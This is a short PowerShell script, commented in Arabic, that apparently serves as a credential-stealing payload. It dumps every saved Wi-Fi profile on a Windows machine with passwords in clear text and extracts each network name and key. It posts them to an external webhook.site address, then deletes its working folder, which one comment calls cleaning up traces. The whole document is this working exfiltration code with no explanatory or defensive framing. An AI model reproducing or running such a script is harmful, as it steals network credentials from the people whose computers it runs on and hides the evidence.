$webhookUrl = "https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822"

$tempPath = "$env:TEMP\wifidump"
New-Item -ItemType Directory -Force -Path $tempPath | Out-Null
Set-Location $tempPath

# تصدير جميع شبكات الواي فاي المحفوظة
netsh wlan export profile key=clear | Out-Null

$wifiData = ""

# قراءة الملفات واستخراج الاسم وكلمة المرور
Get-ChildItem -Filter *.xml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    $ssid = $xml.WLANProfile.name
    $password = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
    if ($password) {
        $wifiData += "SSID: $ssid | Password: $password`n"
    }
}

# إرسال البيانات إلى webhook.site
if ($wifiData -ne "") {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $wifiData
}

# تنظيف الآثار
Set-Location $env:TEMP
Remove-Item -Path $tempPath -Recurse -Force
exit
